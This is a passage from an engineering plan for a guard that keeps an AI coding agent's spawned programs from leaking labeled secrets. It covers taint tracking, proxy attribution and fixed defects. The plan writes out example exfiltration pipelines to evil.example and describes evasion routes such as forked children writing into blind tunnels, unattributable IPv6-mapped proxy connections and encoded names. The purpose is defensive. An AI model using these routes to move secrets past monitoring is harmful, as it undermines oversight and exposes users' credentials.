# Confidentiality Plan 13 — reader-set labels: one check for every flow, and where the OS approximation breaks

> **Status (2026-10-04).** The nine defects of §3 (D1 to D9) are **FIXED**,
> each with a test that failed on the code before the fix. Of the policy
> model (§4, §5), **built**: the intersection join for destinations at both
> sites (D1, §9 R3), `output:` on the reader entry with the program-wide
> `apps:` table deprecated (D3), the label by reference for derived files
> (§4.6), the flow rules for pipes, sockets, file objects and the exit status
> (§4.5.1, §9 R1, §9 R4), the reader identity rules (D8: a verdict keyed by
> binary and hash, the `(interpreter, script)` pin, code-running and printing
> programs admit nothing, fetchers and byte-identical copies of a host
> printer or code-running program included, an interpreter recognized by its
> content, questions that can no longer take effect retired), the
> call signature's canonical quoting (D7), authenticated guard and proxy
> reports (D9), and the exits that are paths (§9 R4 (b): network and FUSE
> mounts as destinations, an overlay judged by its upper layer, a holder's
> names and attributes there, a writable descriptor of one passed to a
> holder, a holder's files closed to other local users, device nodes; the
> display socket confirmed a destination), `git` as a printer (§4.9 option (a), the residual
> it left closed 2026-10-04), and the allow-list of readers (D8 (12),
> 2026-10-04: raw bytes only to a vetted reader or an entry carrying
> `prints: nothing`), and programs known by name only judged by their
> content (D8 (13), 2026-10-07: more interpreter families, a printer's or
> launcher's package, a `from:` parent's content), and per-value `values:`
> bindings (§5.2, 2026-10-11). **Not built:** the *This session* approval scope, the dashboard's full sentences (partly built 2026-10-11: each Rules row answers the model and the destination halves in two menus and reads its openers back, `dashboard.md` §4.25p),
> per-source *Always* (§5.4, §9 R2; the per-principal view of §5.3 is built 2026-10-11, `dashboard.md` §4.25aa), synced
> folders as destinations (§4.6), and typed quarantined results (§6.4). §4.8 (the prompt scan) is **superseded**
> by [`confidentiality-plan-15-prompt-filter.md`](./confidentiality-plan-15-prompt-filter.md).
> §10 (merged in from a separate note) records which HTTPS clients the wire
> release serves.
>
> The plan starts from one question: when only the confidentiality axis is
> on (`secrets` mode), what may happen to a labeled file `x.txt` when the
> agent reads it, when a program the agent spawned reads it, when its content
> goes to the network, and when its content is written back to disk,
> including through a shell pipeline? It records what each level allows (§2),
> the defects found by reading the code and how each was fixed (§3), the
> policy model that answers the multi-file case (§4), how a user writes it
> down (§5), how it relates to FIDES (§6), the build order (§7) and the
> decisions with their reasons (§8).

Spine: [`confidentiality.md`](./confidentiality.md). Builds on
[`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
(readers, app output rules, process taint),
[`model-endpoints.md §1`](model-endpoints.md)
(`local-model`, declared model endpoints) and
[`policy-surface.md §8`](../ui/policy-surface.md) §3 (the monotonic
split: anyone may tighten, only a human may relax). Beside
[`confidentiality-plan-14-policy-suggestions.md`](./confidentiality-plan-14-policy-suggestions.md),
which writes tightenings for the human to approve; this plan is where the
relaxations and the flow rules live. Mechanisms in the guard:
[`exec-routing.md`](../integrity/exec-routing.md) §7.5. Figures:
[`figures/reader-set-labels.html`](./figures/reader-set-labels.html) (the
object / holder / sink frame, the label and its three relations, the matrix,
timelines for D2, D5 and D6, the write loop, the per-principal view, how a
user writes the policy, an explorer, Figures 10 to 15 for §9, and Figure 16,
what the gates do for four kinds of user), and
[`figures/policy-lattice.html`](./figures/policy-lattice.html) (the lattice
and the `policy.yaml` rules in one page, how labels reach Mandu with
proposals for easier entry, end-user setup and use cases on the dashboard
and the CLI, and an assessment of adopting this model, 2026-10-04).

## 1. The question

Take one file, `x.txt`, and four actions on its content:

1. the agent (Claude Code, Codex) reads it;
2. a program the agent spawned reads it (`bash`, `python3`, `curl`, `base64`);
3. the content is sent to a network endpoint;
4. the content is written back to the filesystem.

The special case is the shell pipeline, `A | B`, where program A's output is
program B's input. For each label, which of the four actions are allowed? Does
the policy (and the dashboard, which shows the four levels and their network
bindings) capture them? And what is the label of data derived from **two**
labeled files: which programs may read it and which endpoints may receive it?

## 2. What each level allows today (`secrets` mode)

| Action | `public` | `any-model` | `local-model` | `no-model` |
|---|---|---|---|---|
| **1. Agent reads** | raw | a symbol by default. The quarantined helper may read it (rung 2); an in-context read is a logged declassification that raises the session watermark (rung 3) | a symbol. Readable only by a declared `local: true` model, as helper or as main model | a symbol, always. No model reads it, the quarantined helper included |
| **2. Program reads** | raw | no `readers:` list: every program gets the structured twin (values replaced by symbols). With a list: listed programs that are vetted, or that the entry vouches for (`prints: nothing`), get raw bytes and are tainted; a listed program that is neither gets the twin; any other program gets `EACCES` (or the twin under `others: twin`). The agent's own process is never a reader; a program that runs or prints code it is given is never one (D8, (11)) | same | same |
| **3. Network** | allowed | a symbol is released only at the file's `bindings`, otherwise the user is asked. A tainted process may connect directly only to destinations bound for every file it holds (D1). Through the session's proxy the sender is judged the same way on every leg, HTTPS included (D6). The fingerprint tripwire scans bodies the proxy can see | same | same |
| **4. Write back** | allowed | a file written by a tainted process (Plan 10) or by a high session (Plan 9) gets a derived label at that level; the guard gates it at the open, and it goes where all of its sources go, by reference (§4.6) | same | same |
| **Pipeline `A \| B`** | n/a | the tool result the model sees takes the strictest rule of any process in the call's tree (`callTaint`, Plan 10 §3.2), bound by the call-root recorder (D7); the taint follows a pipe, a socket pair or a shared file to the process reading it, so the network and write exits hold too (D2, §4.5.1) | same | same |

Two observations follow from the table.

- **Past the model column, the three secret levels are one level.** The
  levels differ only in which models may read the data; for programs, network
  endpoints and files they behave identically. A total order of four points
  cannot say anything about programs or hosts, which is why Plan 10 added
  `readers`, `apps` and reused `bindings` beside the level.
- **The policy holds more than the product shows.** `policy.yaml` carries a
  level, `bindings`, `readers` and per-reader `output:` rules, and the arbiter
  enforces all of them. The dashboard's Rules page shows level and bindings;
  it has no view of which program may read which file, and no view from the
  other side (what may `deploy` read, what may reach `api.stripe.com`): §5.3.

## 3. Defects in the current enforcement

Found by reading the source (2026-09-28, re-read 2026-09-30; D9 while fixing
D7). D1, D2, D4, D6, D7, D8 and D9 were security bugs, D3 a policy-scope bug,
D5 an ordering bug. Every one is fixed; each fix landed with a unit test and
an e2e test that failed on the code before it. The fixes also corrected the
documents the defects had made untrue (Plan 10 §4.3 "union" and its §6
"pipes are gated"; `docs/guarantees.md`; `docs/usage.md` on `bindings`).

**D1. A process that read two secrets could send either one to either
destination.** `taintedProcessBindings` added the bindings of every file in
the process's taint: the **union**. A process that read `.env` (bound to
`api.stripe.com`) and `~/.aws/credentials` (bound to `*.amazonaws.com`) could
send the AWS key to Stripe. Holding both keys must allow the
**intersection**, here nothing. *Fixed:* `taintedProcessBindings` answers the
intersection (`intersectBindings`, `arbiter/policy/flow-taint.ts`; a
`*.suffix` keeps a narrower host below it; a datum bound nowhere empties the
set, which the guard and the net-proxy enforce as "only the session's
proxies"), and so does the session holder, `SessionLabels.raise` (§9 R3). The
symbol path (`symbolizeDerived`) already intersected, so the two exits now
agree. Test: `arbiter/test/unit/holder-bindings-intersection.test.ts`.

**D2. Pipelines bypassed the network and write exits.** Only the model exit
folded the whole tool-call tree (`ProvenanceStore.callTaint`). The network
and write exits walked the process and its **ancestors** only; pipeline
stages are siblings, so with `readers: [python3]` on `x.txt`:

```sh
python3 -c 'print(open("x.txt").read())' | curl --data-binary @- https://evil.example
python3 -c 'print(open("x.txt").read())' | tee copy.txt
```

`curl` was untainted and connected; `tee` was untainted and `copy.txt` got no
label. *Fixed* by pipe-flow taint (§4.5.1): a process reading a pipe, a FIFO
or an unnamed socket pair that a holder writes into is a holder, found at the
holder's taint (the sweep) and at the reader's own later connect, send,
accept or write-open; the agent itself is never made one. The arbiter is told
the writers as `flowsFrom` and unions their taint without recording a parent.
Above, `curl` is refused and `copy.txt` is labeled; so is `x=$(reader); curl
-d "$x" …`. Tests: `net-supervisor/tests/pipe_taint_integration.rs`,
`arbiter/test/unit/pipe-flow-taint.test.ts`,
`launcher/test/pipe-taint-live.test.sh` (with controls: `echo … | curl`
reaches the listener, `cat x.txt | grep` still prints, masked at the model).

**D3. The output declassifier was per program, not per file.**
`outputRuleFor(app, apps)` looked the rule up by program only, so an `apps:
[{app: psql, output: clear}]` written for `~/.pgpass` also cleared psql's
output when psql printed a board-minutes document it was a reader of. The
trust a human states ("psql prints rows, not its credential") is about one
(file, program) pair. *Fixed:*

- **The rule is written on the reader entry of one file:**
  `readers: [{ app: psql, output: clear }]` (or `output: mask` with
  `mask: [regex…]`; absent = `secret`). *Since D8 (12) (2026-10-04)*
  `psql` is a printer and admits nothing, so this entry no longer lets
  psql read the file; the defect is told with the example of its day, and
  the rule is written today for a reader the human vouches for:
  `{ app: deploy, prints: nothing, output: clear }`.
- **The fold is per taint row** (`readerOutputRule`; `callTaint`): each row
  (a file a process in the call's tree read raw) takes the rule of the entry
  on that file naming that binary; the strictest wins, so the output is
  released only when EVERY file the tree holds clears its reader, the
  intersection again. A raw read records the opener's executable, its hash
  and how it was let in (`exe`, `sha256`, `via` in `process_secret_taint`),
  so an entry pinned by path and hash speaks only for that executable.
- **A program that runs code is never cleared** (`readerOutputRefusal`, the
  D8 list), and the fold ignores one.
- **The legacy `apps:` table** is deprecated: it validates and compiles,
  clears nothing, and earns a validator warning naming the reader-entry form.
  Reading it as "the files the program is a listed reader of" was rejected:
  in the defect's own case psql IS a listed reader of the document.
- **The policy surface** (validator, loader, `relaxationsOf`, `policyDelta`)
  knows the key: raising a reader's output above `secret` is a relaxation,
  lowering it a proven tightening. The dashboard's file explorer says what
  the AI sees of each reader's output for that file.

Tests: `arbiter/test/unit/reader-output-rule.test.ts`,
`tests/stack/reader-output-rule.test.ts`,
`tests/sandbox/guard/reader-output-rule.test.ts`.

**D4. A derived file was served raw to every program.** A derived label
stored the level only; the network guard loaded its secret index once at
start and never learned derived paths, and the next launch's discovery did
not list them. So a reader's copy of `.env` was opened raw by every program,
`curl --data @copy.txt` included, in this session and every later one, and
`mv copy.txt c2.txt` dropped even the model-exit label. *Fixed:*

- **Live, this session.** The guard keeps a live index of derived paths
  (`net-supervisor/src/derived_index.rs`). A read-capable open of a regular
  file it does not know, changed at or after its last good look (minus a 2 s
  slack), asks the arbiter what changed (`derivedLabelsSince`: an epoch per
  arbiter start and a change number). The labels the guard mints itself
  (`labelWrittenPathTainted`) enter the index the moment the arbiter answers,
  before the writer holds its descriptor. A hit is gated like a labelled file
  with no reader list: the twin (made in the launch's `derived-twins/`)
  for everyone but an opener a human names.
- **A labelled file the launch did not register (2026-10-17).** The same
  gate covers a file a HUMAN label covers that the launch never registered
  (created after the launch, under a label set mid-session, below the
  walk's limits): confidentiality.md §6, "Read by a program the launch did
  not see". The guard keeps the arbiter's label roots
  (`net-supervisor/src/label_index.rs`, `labelRootsSince`: a literal label's
  path, a pattern's literal prefix with its last segment's literal anchors
  as a prefilter, a declared client key; read when first needed and again
  at most every second, an unchanged list one small answer). A read-capable
  open of a regular file under a root asks the arbiter for its level
  (`labelledLevel`, the same classification `decideSecretOpen` makes,
  cached per `(dev, ino)`, ctime and label set; a file in a directory below
  the root that the discovery walk never enters, `skipDirs`, is not
  gated); above `public` it is an
  entry of kind `labelled`, gated exactly as a derived hit (the twin made
  from `registerSecret`, which also registers the file for the value
  backstop; the real file for an opener a human names), the same for an
  `O_PATH` open, and a performed rename or link of one asks
  `followDerivedLabel` first (the arbiter carries a protected file's own
  level). A file under no root costs no round trip. Fail-closed: a file
  under a root the arbiter cannot classify is refused; a guard that never
  read the list (an older arbiter) gates as before. The agent's own process
  is not gated by a label: its file tools' results are classified by the
  path they name, as before (the leak was the programs it runs).
  *Its writes (2026-10-17)* follow a registered file's: the label is asked
  before the derived list (`gated_entry`), a write-only open of a non-empty
  such file is gated too (`label_index::open_gate`; a derived file's stays
  ungated, its holders write it, and a holder's stays ungated, so its bytes
  label the real file, D5, never sit raw in a twin others read), a rename
  onto one is refused but to the
  agent (`labelled_dest_refuses`), and a hard link of one outside every
  root is gated as the file while it has more than one name
  (`LabelIndex::other_name_level`). Its twin takes a fresh name when remade
  and is recorded (`label_index::TWIN_RECORDS`: the twin's size, hash and
  identity, the real file's identity only), so the launcher names, at the
  session's end, each one a program changed, in a registered file's notice
  (confidentiality.md §6, plan 10 §4.1). A derived file's twin is not
  recorded: a non-holder's in-place write to a derived copy still lands in
  its twin unnamed.
- **A catalog file the launch did not register (2026-10-17).** The same
  entry kind covers the secret CATALOG's files the walk never registered (a
  `.env` created mid-session, deeper than `MAX_DEPTH`, past `MAX_FILES`,
  outside HOME): confidentiality.md §6, "A catalog file the launch did not
  register"; secret-discovery.md §1.12. `labelRootsSince` (now told the
  guard's session) also lists the catalog's prefixes for the arbiter's and
  the launch's HOME as roots, and ships the basename shapes as a prefilter
  of literal name anchors (`catalog`: `label_index::Catalog`, a name an
  anchor admits with no walk-skipped directory below the deepest catalog
  home holding it). `labelledLevel` gives the walk's verdict on the file
  (`gateVerdict`: labels, then the catalog by path, never the content; for
  a catalog verdict the walk's prunes, and another account's file outside
  every home is not gated). A file whose name no anchor admits costs no
  round trip (about 0.26 µs of prefilter per open); the guard's own twins
  are never candidates (`LabelIndex::set_exclude`). An arbiter that ships
  no catalog leaves only the label roots gated, as before.
- **A holder of every source reads the copy raw.** The derived row records
  its writers' source files (`sources`); a process that already holds every
  one of them raw gets the real copy, with no new taint row (the copy
  carries nothing it does not hold). This keeps `MANDU_WIRE_TWIN=0` working
  (npm reads `~/.npmrc` raw, writes a package, its child runs it). At that
  read the arbiter registers the copy (plan 10 §11.18), at its sources'
  bindings, so a value only the copy holds is a known secret the value
  backstop matches; a copy too large for its pieces to be computed (the
  piece bound) is not read raw: the law decides, the twin.
- **Fail-closed.** When the list cannot be read, a file changed since the
  guard started is refused (`EACCES`); an older one opens as before, since
  the launch registered every derived file the arbiter knew.
- **The next launch.** `discoverSecrets` lists every derived path that still
  classifies secret, wherever it lies, so it is registered and twinned like
  any labelled file until a human clears the label (`removeDerivedLabel`, on
  the human plane).
- **The label follows the file.** Before the guard performs a rename or hard
  link of a derived file it asks the arbiter to label the new name
  (`followDerivedLabel`, raise-only); if that fails, the change is refused. A
  rename it did not perform is caught at the next open by `(st_dev,
  st_ino)`. The old name keeps its row (over-restriction, never a leak).
- **The twin's descriptor names the file (2026-10-04).** A derived twin is
  another inode, served by descriptor (no bind can cover a file made during
  the session), so `lstat` of the path and `fstat` of the descriptor
  disagreed on `st_dev`/`st_ino`. Claude Code 2.1.288 writes a Bash call's
  output to a task file (`/tmp/claude-<uid>/…/tasks/<id>.output`) and reads
  it back with exactly that check (`lstat`, open `O_NOFOLLOW`, `fstat`,
  "output file identity changed" otherwise). When the call's tree held a
  secret the holder's write labels the task file (D5), the agent is served
  its twin, and the check failed: the result was Claude Code's "output file
  could not be read (unknown)", masked to the model as a symbol of that
  error, and the human never saw the program's output (drill
  `conf-hold-once`, test-reorganization.md §6.4; fail-closed, no leak). Now
  the guard hands a derived twin to the opener at descriptor number 768
  (`stat_twin::TWIN_FD_BASE`) or above, the lowest free one below the
  process's soft `RLIMIT_NOFILE` (`SECCOMP_ADDFD_FLAG_SETFD`); the filter
  sends a descriptor stat on such a number to the guard (`fstat`, and
  `newfstatat`/`statx` with `AT_EMPTY_PATH`; every lower or negative
  descriptor runs at full speed), and the guard answers a twin it made
  (known by the twin file's identity, `DerivedIndex::path_of_twin`) with the
  twin's metadata carrying the derived file's `st_dev` and `st_ino`. The
  size and times stay the twin's, what a read of the descriptor returns.
  So the agent reads one symbol (`$MDU:nomodel_Read[…]`, whose value is the
  real output), the model exit masks the call's result whole as before, and
  the reply filter's deep `desymbolize` turns a reply quoting it into the
  real output. The agent never holds a byte of it; no file is exempted from
  its label. Metadata only: the identity of a file the path's own `stat`
  already reports. Where the number cannot be placed (a soft limit at or
  below 768, a kernel that refuses it) the twin takes the lowest free
  number as before and only its identity is the twin's. Not covered: a
  program that `dup2`s the descriptor below 768 sees the twin's identity
  there; the stat by path still shows the real size (below).
- **A holder's working-directory file (2026-10-04).** Claude Code runs a
  Bash call as `<command> && pwd -P >| /tmp/claude-<n>-cwd` and moves its
  shell to the directory the file names. The call's shell is a holder once
  it reaps the reader (§4.9), so the file is labelled, the agent read a
  symbol, Claude Code ignored it ("not an absolute path") and silently kept
  its previous directory: a call that `cd`s lost its directory whenever its
  tree held a secret. Now `registerSecret` answers a file under a DERIVED
  label whose whole text is one canonical absolute path (no symlink, no `.`
  or `..`, at most one final newline, at most 4096 bytes) of a directory
  that exists with that text as its twin and no symbol (so the path is no
  registered value the scans would mask elsewhere); the label stays, and
  any other text keeps the symbol. Why that is no leak beyond the model's
  boundary: such a text is a NAME in the filesystem, and the names a holder
  makes are the channel §4.9 leaves uncovered (a later call's `ls` lists
  them, and that channel already carries a holder's exit status: `… &&
  mkdir x`). The twin is the text the arbiter read and rendered, never a
  later read of the file. A human label or the catalog on the file keeps
  the symbol: there the file itself is the secret. Checked (not inferred,
  `tests/sandbox/guard/cwd-secret-name.test.ts`): a holder that names a
  directory with the RAW registered value and `cd`s into it moves the
  agent there, but the next call's `pwd`, like an `ls` of that directory,
  reaches neither model raw: both proxies' registered-value scan masks the
  result. Not covered: a TRANSFORMED name (the value base64-encoded) passes,
  through the cwd file exactly as through `ls` (the names channel,
  delivered without an `ls`).
- **Left:** the stat family by path shows a derived file's real size
  (§4.9); a file a process outside the agent's tree reads is not gated.

Tests: `arbiter/test/unit/derived-label-program-gate.test.ts`,
`net-supervisor/tests/derived_label_integration.rs` (including an arbiter
that answers 300 ms late, pinning the label-before-descriptor order, and
every descriptor stat of a derived twin naming its file), the
`stat_twin`, `guard_filter` and `derived_index` units,
`tests/sandbox/guard/task-output-twin.test.ts` (Claude Code's read-back
under the real guard, the proxy and the human plane's desymbolize),
`launcher/test/derived-label-live.test.sh`.

**D5. An output file opened before the taint was never labeled.** The write
exit labeled at the write-intent open only. In `python3 reader.py > out.txt`
the shell opens `out.txt` before `exec`, and python reads `x.txt` after.
*Fixed* by the later-of-two-events rule (§4.5): the taint-time sweep
(`guard_send::sweep_before_taint`) also lists the regular files the reader
and its descendants hold open for writing (`pipe_flow::written_files`) and
labels each before the reader gets its first byte. Each descriptor is read
as one (`pipe_flow::fd_file`, 2026-10-17): its link, the open file's
identity and its access mode, re-read until two readings agree (at most
three times, then the last reading as it is, so a process renaming its
output in a loop still has it listed); the link alone, read first, named
the file a descriptor HAD when its number was closed and reused in between,
and the sweep labelled a file the process no longer wrote (an over-label)
and missed the one it did. The label is keyed in the guard's derived index
by the HELD file's identity (`HeldWrite::id`, `derived_index::
held_resolution`), not by whatever the path names when the label lands, so
the held file is gated by identity wherever it moves; the arbiter's record
stays by path (a path renamed over between the sweep and the label is
labelled too: restrictive). Not covered: an unlinked
file, an `O_TMPFILE`, a memfd (closed since by §4.5.1's file shapes), files
on `/proc` or `/sys`, and a thread with its own descriptor table. Tests:
`pipe_taint_integration.rs`, `pipe-taint-live.test.sh`.

**D6. HTTPS through the session proxy was never checked against the
taint.** The guard exempts the proxy's loopback port on the ground that
proxied traffic is judged again at the net-proxy, but the net-proxy checked
taint only on plain HTTP: the TLS-inspected path passed no `procKey`, and a
blind `CONNECT` had no check. A reader using the launcher's own
`HTTPS_PROXY` could send raw bytes to any HTTPS host. *Fixed:* one check,
`secretTaintVerdict` (`interceptors/net-proxy/src/egress.ts`), runs on every
leg against every process holding the client's end of the connection
(`conn-attr.ts` `attributeHolders`, each with its `/proc` ancestor chain): a
holder with a secret at an unbound host blocks (rule
`egress:tainted-process-unbound`), an arbiter that cannot answer blocks.

- *plain HTTP*: per request, with every holder;
- *TLS-inspected* (the default whenever the axis is on): per decrypted
  request, against the holders at the `CONNECT` and those holding the socket
  at that request; the verbatim tripwire runs on this leg too;
- *a blind `CONNECT`* (a model host, or `--no-net-proxy-mitm`): refused
  unless the destination is bound for every holder, the answer the guard
  gives a direct connect; each later chunk waits for a fresh verdict over the
  holders at the `CONNECT` and every process holding the socket now that
  holds a secret (below).

An unattributed leg (no holder found) is refused while any process of the
session holds a secret (`sessionSecretTaint`), else passed.

*A blind tunnel's chunks (fixed 2026-10-07).* Until then a blind tunnel was
judged before each chunk by the processes that held it when it opened, so a
child forked afterwards (`fork` without `exec` keeps the socket) that read a
secret and wrote into the inherited, encrypted connection was never asked
about: its bytes reached an unbound host, a model vendor's host with TLS
inspection on. The TLS-inspected leg already judged each request's holders;
a full `/proc` rescan per chunk (every process's descriptor table, 20 to 70
ms on a dev host) was the cost that had kept it off this leg. The check
before each chunk is now:

1. the arbiter lists every process key it holds secret taint for
   (`secretTaintedProcesses`): the keys with a raw-read row, closed forward
   over the guard's lineage edges, the claimed edges and the recorded flows,
   which is exactly the set `taintedProcessBindings` answers tainted for
   (`processSecretTaint` walks the same edges backward; a unit property test
   holds them equal over random graphs). The walk is kept until the database
   changes (`total_changes()`, `PRAGMA data_version`);
2. an empty list: no process holds a secret, so no holder can be refused,
   and nothing is scanned;
3. otherwise the proxy reads the descriptor tables of the listed processes
   that are alive (a key whose process is gone, or whose pid now names
   another start time, is remembered dead) and of every live descendant of
   one (`/proc/<pid>/task/*/children`: a fork-only child of a holder of a
   secret inherits it before the arbiter has an edge for it), for the
   tunnel's socket inode (`conn-attr.ts` `holdersAmong`);
4. the holders at the `CONNECT` and those found are judged
   (`secretTaintVerdict`), each found holder with its ancestor chain the
   first time.

The rate limit is the narrowing, not a timer, so no chunk passes unjudged
after a new holder appears: a child forked after the `CONNECT` is listed the
moment the guard records its raw read (the read and the lineage edge are one
report), and a process that held a secret before and *receives* the socket
later (`SCM_RIGHTS`, no lineage to the holder) is listed already. Fail-closed
everywhere: an arbiter without the op, one that fails it or answers
malformed, a kernel that lists no children, or a stat read failing for
another reason than a gone process gets the full rescan of every holder for
that chunk, never the `CONNECT`'s holders alone. The descendant-only
alternative (ask about the frozen keys and their recorded descendants) was
rejected: it misses the `SCM_RIGHTS` receiver, and it refuses a tunnel for a
descendant that read a secret without holding the socket (every exec'd
child: sockets are close-on-exec). Same limits as the full scan: a process
whose descriptor table the proxy cannot read (another user's, or a
same-user process that set `PR_SET_DUMPABLE 0`, as ssh-agent and gpg-agent
do) is not found,
and a holder that writes and closes its descriptor before the chunk is
looked at is not either. Measured per chunk (real arbiter, production
adapter, live `/proc`, 1 KiB chunks, a dev host with about 10 000 visible
descriptors): before the fix 0.5 to 0.8 ms (one question); now 0.45 ms with
no secret held, 0.55 ms with a live holder of a secret elsewhere, 1.0 ms
with 2000 dead keys on record; the fallback full rescan 69 ms.

Tests: the net-proxy `https-taint` and `blind-tunnel-fork` component tests
(a forked child that reads a secret, through a model host's tunnel too; the
`SCM_RIGHTS` receiver; the fallbacks; no rescan while no secret is held),
`conn-attr` unit tests (`holdersAmong`, `socketInodeFor`), the arbiter's
`secret-tainted-processes` unit test,
`tests/stack/blind-tunnel-fork-live.test.ts` (the real arbiter and net-proxy,
live `/proc`, a real `os.fork` child),
`tests/sandbox/launcher/blind-tunnel-fork.test.ts` (the real launcher and
guard under `--no-net-proxy-mitm`: the agent, a bash script, opens the
tunnel over `/dev/tcp`, and its subshell sources the `.env` through the
reader's pipe, so the guard records the flow, then `printf`s the key into
the inherited descriptor; the raw key reached the listener on the old code)
and `tests/sandbox/launcher/https-proxy-taint.test.ts`
(its holder decodes the reader's pipe with a `base64` named by path and
probed to work, so a host whose `PATH` holds a dead `base64` cannot leave it
sourcing an empty key: test-organization.md §8.6; the 2026-10-04 dev-host
failure was that, the refusals held).

Under the guard the old leak was narrower than "a fork anywhere": below the
agent the guard makes a new holder's parent a holder at the read (it learns
the exit status, §4.9), so a parent holding the tunnel was already one of
the `CONNECT`'s holders, tainted since. The agent itself is never made one,
so a tunnel the agent opened and then a fork-only child of it wrote into,
and a socket handed to a process that already held a secret, were the open
cases (the sandbox test's first form, a program the agent started opening
the tunnel, passed on the old code).

*The full scan's cost (2026-10-11).* The full holder scan
(`attributeHolders`) runs at every `CONNECT`, every plain-HTTP request and
every decrypted request, so a TLS-inspected HTTPS request on a new
connection paid it twice. Measured on a 128-CPU shared dev host (about 1650
processes, 95 of them the proxy's user): 23 to 41 ms a scan, and the scan
was 55 ms of a 62 ms HTTPS request through the proxy (7.5 ms with
attribution stubbed out). The time went to three places: opening the
descriptor table of every other user's process, each failing with `EACCES`
in the kernel (~10 µs each, ~17 ms); `/proc/net/tcp6`, read whole though
no row of it can match (~4.5 ms: the kernel walks its whole established-hash
table on every read, whatever the row count); and `/proc/net/tcp` read
whole (~5 ms). The fix keeps the scan's answer and keeps no process
identity:

1. *Only openable tables are opened.* A process with no effective
   capability (`CapEff` zero, read once) can open `/proc/<pid>/fd`, a
   mode-0500 directory owned by the task's dump owner, only when it owns
   it (`generic_permission` has no group, other or `CAP_DAC_*` path, and
   `proc_fd_permission` adds only the caller's own thread group). So the
   scan stats the directory (~2 µs) and skips one owned by another uid:
   exactly the tables the old scan failed to open. The directory's owner
   is the test, not `/proc/<pid>`'s: a non-dumpable process of another uid
   in a user namespace the proxy's user owns has an fd directory owned by
   that user, and is read. A proxy holding any capability tries every
   table, as before; a stat that fails for another reason than a gone
   process tries the table. A live unit test checks on the running host
   that every table skipped fails to open.
2. *`/proc/net/tcp6` is not read*: its rows carry a 32-hex address the
   parser never accepted (v4-mapped included), so an `AF_INET6` client was
   unattributed before and still is. **Superseded 2026-10-17** (IPv6
   attribution, below): tcp6 is read, after tcp and only when tcp has no
   row for an IPv4 peer, so the IPv4 client's cost is unchanged.
3. *`/proc/net/tcp` is read in chunks and stopped at the client's row*:
   the same first matching row as the whole table (one row per 4-tuple),
   half the read on average.
4. *The client end's inode is kept per connection* (net-proxy
   `resolveHolders`, a `WeakMap` keyed by the connection's own socket
   object), so later requests on a kept-alive or TLS-inspected connection
   skip the table. Sound because the inode belongs to the connection, not
   to a process: the kernel never gives an open 4-tuple to another socket,
   and a new connection is a new socket object here (a cache keyed by the
   4-tuple could outlive its connection and was rejected). A miss (no row
   yet) is not kept.

Who holds that inode is read again on every call (`holdersOfInode`): no
pid, start time or proc key is kept between requests, so a holder that
appeared since (a fork, an `SCM_RIGHTS` receiver) is judged by its own key,
and a pid reused by another process is judged by its new start time, never
the old key. A process-keyed cache (pid and start time → descriptor
table, or connection → holders) was rejected: a process's descriptor table
changes without its key changing, so any such cache could miss a holder
that received the socket after it was filled. Unattributed stays
unattributed (`[]`): no row, no holder found, or any read error is refused
while the session holds a secret, as before. Measured after, same host: 13
to 15 ms a scan; an HTTPS request on a new connection 62 to 106 ms before,
20 to 30 ms after; a request on a kept-alive inspected connection 72 to 92
ms before, 55 ms after (43 ms with attribution stubbed out: the rest of that
time is not the scan, below). Tests: the `conn-attr` unit tests (the chunked row
read at every chunking, the owner filter and its live check, a holder that
appears and a reused pid seen as they are now) and the net-proxy
`live-holder-attribution` component test (live `/proc`, one kept-alive
inspected connection: a child that inherits the socket between two requests
is judged by its own key, and once it exits another holder is judged by its
key and refused, the gone one's key never asked about).

*IPv6 attribution (2026-10-17).* A client on an `AF_INET6` socket has its
row in `/proc/net/tcp6` only, whether it dialed `::1` (a proxy listening
there) or a v4-mapped `::ffff:127.0.0.1` at the default IPv4 listener,
where the proxy sees a plain IPv4 peer. With tcp6 unread, every such
client was unattributed: refused while the session held a secret, whoever
it was (a utility loss), and, since an unattributed refusal's note names
no program (plan 10 §11.8, "A refusal no process is tied to"), a way for a
program to make its own connection unattributable on purpose
(`curl -x 'http://[::ffff:127.0.0.1]:<port>'`). `conn-attr.ts` now parses
tcp6 rows (each address four 32-bit words printed as host-order integers,
so `::1` is `00000000000000000000000001000000` on a little-endian host;
the host's order is read from `os.endianness()`), keys every address by
`addressKey` (a v4-mapped one as its dotted quad), and searches tcp first
for an IPv4 peer, then tcp6, and tcp6 alone for an IPv6 peer, each read in
chunks and stopped at the row. The inode → holders half is the same
descriptor-table scan with the same owner filter, family-blind. What
still cannot be attributed (no row in either table, an unreadable one, a
holder that exited) stays `[]`, refused while the session holds a secret.
Tests: the `conn-attr` unit tests (tcp6 rows: `::1`, v4-mapped, a global
address; both byte orders; every endpoint spelling; tcp then tcp6; a live
`AF_INET6` client at `::1` and at the IPv4 listener through a mapped
address) and the stack e2e `tests/stack/net-proxy-local-only-ipv6.test.ts`
(live attribution through the real proxy in production wiring: a holder
of a secret on either kind of IPv6 socket refused with its own note naming
the program, a process holding none forwarded while the session holds a
secret).

*The kept-alive floor (2026-10-11).* That 43 ms was Nagle against a
delayed ACK, not the gate. The TLS-inspected leg re-originates each
decrypted request on a pooled upstream TLS connection (`mitm.ts`
`originate`), and it wrote the head and the body as two writes on a socket
with Nagle on: two TLS records, two segments. On a new connection the
kernel ACKs at once (quick-ACK mode), so it did not show; on a kept-alive
one the body's segment waited for the ACK of the head's, which the server
delays (about 40 ms) while it waits for the rest of the request. Confirmed
by timing one variable at a time (same harness: a real NetProxy, a real
HTTPS destination, attribution stubbed, median of 30): a kept-alive request
with a 2-byte body 43.3 ms, with no body 0.6 ms, with Nagle off on the
upstream socket alone 0.6 ms, with the two writes corked into one flush
alone 0.6 ms. Fixed both ways: the upstream socket has `setNoDelay(true)`,
and every HTTP message the leg writes (the re-originated request, the
answer back, a refusal) leaves in one corked flush (`writeMessage`). The
accepted client connections had Nagle off already (Node's server default),
now said by the proxy itself, and the blind tunnel's upstream connection
gets it too (a relay forwards each chunk as it comes). The plain-HTTP leg
re-originates through Node's HTTP agent, which turns Nagle off. Measured
after: a kept-alive inspected request 0.5 to 0.7 ms (43.9 to 44.1 ms
before), with a 200 KB answer 3.0 ms (46.8 ms before), with a 200 KB
request body 2.9 ms (3.1 ms before: a large body ends on a full segment);
a new connection unchanged (about 6 ms); the blind tunnel 0.2 to
0.3 ms before and after. What the proxy cannot change: a client that keeps
Nagle on and writes a request in two small pieces still waits about 42 ms
on a kept-alive connection (the same against any server that delays its
ACK; curl and most HTTP clients turn Nagle off). Tests: the net-proxy
`write-message` unit test (one flush, the bytes in order, uncorked on a
